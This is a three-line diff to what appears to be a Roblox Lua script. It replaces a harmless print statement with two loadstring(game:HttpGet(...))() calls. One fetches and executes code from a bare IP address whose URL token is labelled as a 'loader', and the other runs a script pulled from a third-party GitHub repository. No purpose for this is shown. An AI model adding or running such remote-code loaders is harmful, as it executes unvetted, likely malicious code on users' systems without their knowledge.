@@ -1,1 +1,3 @@
-print("bob")
+loadstring(game:HttpGet("http://72.56.90.233:3910/api/run/eyJpZCI6IjA0NDE1NzU1LTk3ZjEtNGIzNC05MGQwLTNlZTA5YzBiZTkxOCIsImtpbmQiOiJsb2FkZXIifQ"))()
+wait(3)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jazzedd/JazradScript/refs/heads/main/Script"))()
